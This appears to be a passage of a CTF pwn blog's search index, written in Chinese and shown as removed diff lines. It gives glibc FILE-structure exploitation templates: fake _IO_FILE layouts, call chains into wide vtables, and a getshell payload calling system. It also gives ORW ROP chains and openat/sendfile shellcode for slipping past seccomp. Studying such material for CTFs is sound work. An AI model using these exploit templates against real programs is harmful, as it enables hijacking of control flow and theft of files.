-<p><em>条件绕过</em>        </p>
-<pre><code>需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0
-需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。
-</code></pre>
-<br>
-    模板（getshell）
-<em>需要将伪造chunk的pre_size位伪造成  '  sh;'  或者  ';sh\x00'  </em>    
-
-
-<pre><code>    fake_io_file = p64(0)*2 + p64(1) + p64(2)
-    fake_io_file = fake_io_file.ljust(0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr+0x100) # _wide_data
-    fake_io_file = fake_io_file.ljust(0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff) # _mode
-    fake_io_file = fake_io_file.ljust(0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps) # vtable
-    fake_io_file = fake_io_file.ljust(0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr+0x200)
-    fake_io_file = fake_io_file.ljust(0x200-0x10,b&#39;\0&#39;)+p64(0)*13+ p64(sys)
-    
-</code></pre>
-<br>
-<br>
-
-<h3 id="2、利用IO-wfile-underflow-mmap"><a href="#2、利用IO-wfile-underflow-mmap" class="headerlink" title="2、利用IO_wfile_underflow_mmap"></a>2、利用IO_wfile_underflow_mmap</h3><p><em>调用链</em><br>    _IO_wfile_underflow_mmap<br>        _IO_wdoallocbuf<br>            _IO_WDOALLOCATE<br>                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)          </p>
-<br>
-<em>伪造</em>   
-
-<pre><code>_flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有个空格
-vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可
-_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)
-_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
-_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)
-_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
-_wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0
-_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
-_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
-</code></pre>
-<br>
-<em>条件绕过</em>       
-
-<pre><code>需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。        
-</code></pre>
-<br>
-
-<h3 id="3、利用-IO-wdefault-xsgetn"><a href="#3、利用-IO-wdefault-xsgetn" class="headerlink" title="3、利用_IO_wdefault_xsgetn"></a>3、利用_IO_wdefault_xsgetn</h3><p><em>调用链</em>    </p>
-<pre><code>_IO_wdefault_xsgetn
-    __wunderflow
-        _IO_switch_to_wget_mode
-            _IO_WOVERFLOW
-                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)
-</code></pre>
-<br>
-<em>伪造</em>       
-
-<pre><code>_flags设置为0x800
-vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可
-_mode设置为大于0，即满足*(fp + 0xc0) &gt; 0
-_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
-_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A
-_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)
-_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
-_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C
-</code></pre>
-<br>
-
-<p><em>条件绕过</em>   </p>
-<pre><code>直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。
-随后当more != 0时会进入__wunderflow。   
-要想调用到_IO_switch_to_wget_mode，需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。
-当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。
-</code></pre>
-<br>
-<br>
-
-<hr>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>IO</tag>
-        <tag>house of</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>orw</title>
-    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
-    <content><![CDATA[<hr>
-<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1> <span id="more"></span>        
-
-<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
-<br>
- 
-<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
-原型: ssize_t read(int fd, void *buf, size_t count);
-参数:
-fd：文件描述符。
-buf：指向存储读取数据的缓冲区的指针。
-count：要读取的字节数。      
-
-2. readv
-原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
-参数:
-fd：文件描述符。
-iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
-iovcnt：iovec 结构体的数量。  
-
-3. write
-原型: ssize_t write(int fd, const void *buf, size_t count);
-参数:
-fd：文件描述符。
-buf：指向要写入的数据的缓冲区的指针。
-count：要写入的字节数。
-
-4. writev
-原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
-参数:
-fd：文件描述符。
-iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
-iovcnt：iovec 结构体的数量。
-
-5. open
-原型: int open(const char *pathname, int flags, mode_t mode);
-参数:
-pathname：要打开的文件的路径。
-flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
-mode：文件权限，仅在使用 O_CREAT 标志时需要。
-
-6. openat
-原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
-参数:
-dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
-pathname：要打开的文件的路径。
-flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
-mode：文件权限，仅在使用 O_CREAT 标志时需要。
-
-7. sendfile
-原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
-参数:
-out_fd：目标文件描述符（通常是套接字）。
-in_fd：源文件描述符。
-offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
-count：要发送的字节数。
-</code></pre>
-<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
-<pre><code>o=base+libc.sym[&#39;open&#39;]
-r=base+libc.sym[&#39;read&#39;]
-w=base+libc.sym[&#39;write&#39;]
-orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
-orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
-orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
-</code></pre>
-<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
- <br>
- ### <em>sendfile</em>
- 禁用open、execve、read、write、readv、writev
-
-<pre><code>asm(&#39;&#39;&#39;
-mov rdi,3;                    #openat调用
-mov rdx,0;
-mov r10,0;
-mov rsi,flag;                 #flag地址
-mov rax,257;
-syscall;
-
-mov rdi,0;                    #sendfile调用  
-mov rsi,3;
-mov rdi,1;
-xor rdx,rdx;
-mov r10,0x33;                 #读取大小
-mov rax,40;
-syscall;
-
-
-mov rax,60;                    #exit调用
-xor rdi,rdi;
-syscall;
-&#39;&#39;&#39;
-)
-</code></pre>
-<p>其中指令的表现形式也视具体情况而变动。<br><br><br>比正常情况下少了8字节</p>
-<pre><code>o = libc_base + libc.sym[&#39;open&#39;]
-sendfile = libc_base + libc.sym[&#39;sendfile&#39;]
-orw = p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
-orw+=p64(rdi)+p64(1)+p64(rsi)+p64(3)+p64(rdx)+p64(0)+p64(r10)+p64(r/w_size)+p64(sendfile)
-</code></pre>
-<hr>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>orw</tag>
       </tags>
   </entry>
 </search>
